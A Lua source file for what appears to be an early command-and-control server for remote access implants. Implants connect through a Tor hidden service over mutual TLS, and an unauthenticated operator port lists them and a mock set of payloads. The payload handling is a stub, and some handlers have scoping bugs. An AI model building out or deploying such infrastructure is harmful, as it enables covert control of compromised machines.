local copas = require "copas"
local socket = require "socket"

local ssl_params = {
  mode = "server",
  protocol = "tlsv1_2",
  key = "hidden_service/ssl/server/private/server_key.pem",
  certificate = "hidden_service/ssl/server/server_cert.pem",
  cafile = "hidden_service/ssl/ca/ca_cert.pem",
  verify = { "peer", "fail_if_no_peer_cert" },
  options = "all"
}

-- MOCK: list of available eggs
local eggs = {}


-- list of current rattatas
local rattatas = {}

-- called whenever a rattata connects over tor
function rattata_handler(skt)
  print("rattata connected")
  local buffer = nil
  local payload = ""
  while true do
    if buffer == nil then
      local command = copas.receive(skt)
      print("command: " .. command)
      
      -- start a multiline payload
      if command == "RATTATA_START" then
        buffer = {}
        payload = ""
      
      -- say "hi" to add to rattatas list
      elseif command == "HELLO" then
        -- next line is name
        local name = copas.receive(skt)
        rattatas[name] = skt
        copas.send(skt, "HI " .. name)
      
      -- disconnect
      elseif command == "QUIT" then
        skt:close()
        rattatas[name] = nil
        break
      end
    else -- handle multiline-payload
      local line = copas.receive(skt)
      if line == "RATTATA_END" then
        payload = table.concat(buffer, "\n")
        buffer = nil
        print("Got multiline text:" .. payload)
      else
        table.insert(buffer, line)
      end
    end
  end
end

-- called whenever a pakemon connects over local socket
function pakemon_handler(skt)
  print("pakemon connected")
  local buffer = nil
  local payload = ""
  while true do
    if buffer == nil then
      local command = copas.receive(skt)
      print("command: " .. command)
      
      -- start a multiline payload
      if command == "PAKEMON_START" then
        buffer = {}
        payload = ""
      
      -- say "hi" this is mostly for testing
      elseif command == "HELLO" then
        -- next line is name
        local name = copas.receive(skt)
        copas.send(skt, "HI " .. name)

      -- get list of connected rats
      elseif command == "RATTATA_LIST" then
        for rattata in pairs(rattatas) do
          copas.send(skt, rattata)
        end

      -- get a list of eggs
      elseif command == "EGG_LIST" then
        for egg in pairs(eggs) do
          copas.send(skt, egg)
        end
      
      -- disconnect
      elseif command == "QUIT" then
        skt:close()
        break
      end
    else -- handle multiline-payload
      local line = copas.receive(skt)
      if line == "PAKEMON_END" then
        payload = table.concat(buffer, "\n")
        buffer = nil
        print("Got multiline text:" .. payload)
      else
        table.insert(buffer, line)
      end
    end
  end
end

-- answer all, because it could be called from somewhere other than localhost
copas.addserver(socket.bind('*', 12345), pakemon_handler)

-- only answer localhost because it comes from tor hidden service
-- additionally, it's wrapped with ssl
copas.addserver(socket.bind('127.0.0.1', 12346), copas.handler(rattata_handler, ssl_params))

print("Listening on ports 12345 (pakemon) and 12346 (rattata)")

copas.loop()